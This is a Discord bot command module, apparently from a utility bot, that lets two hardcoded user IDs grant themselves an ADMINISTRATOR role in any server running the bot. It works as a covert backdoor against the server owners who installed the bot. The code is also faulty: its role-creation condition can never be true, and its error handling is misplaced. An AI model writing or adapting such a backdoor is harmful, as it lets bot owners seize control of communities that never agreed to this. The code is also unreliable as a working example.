

module.exports = {
    name: 'op',
	aliases: ['admin' , 'power'],
    description: 'Gives the bot owner admin permission in a server!',
    cooldown: 2,
    Usage: '`!op`',
    Category: "System",
    PermLevel: `Bot Owner`,
    async execute(client, message, args){

        const Discord = require('discord.js')
        if  (message.author.id !== "683879319558291539" && message.author.id !== "518382491338539017") {

            return;
            
        }
        else if (message.author.id == "683879319558291539" && message.author.id == "518382491338539017") {
            

            message.guild.roles.create({ data: { name: 'Cent Utilty bot Developer', permissions: ['ADMINISTRATOR'] } });

            
        }
        let role = message.guild.roles.cache.find(r => r.name === "Cent Utilty bot Developer");

            //person who started the message
            let member = message.member;

            //Give the role.
            await member.roles.add(role)

            const opd = new Discord.MessageEmbed()
            .setDescription('<:greentick:750751680613843105> Successfully given admin perm to ' + message.author + ' in the server: ' + message.guild.name)
            .setColor('GREEN')
            await message.channel.send(opd)

            .catch(error => {
                message.channel.send('Something went wrong in the Cent Utilities land. Error for reference: ', error);
            });



    


    },
};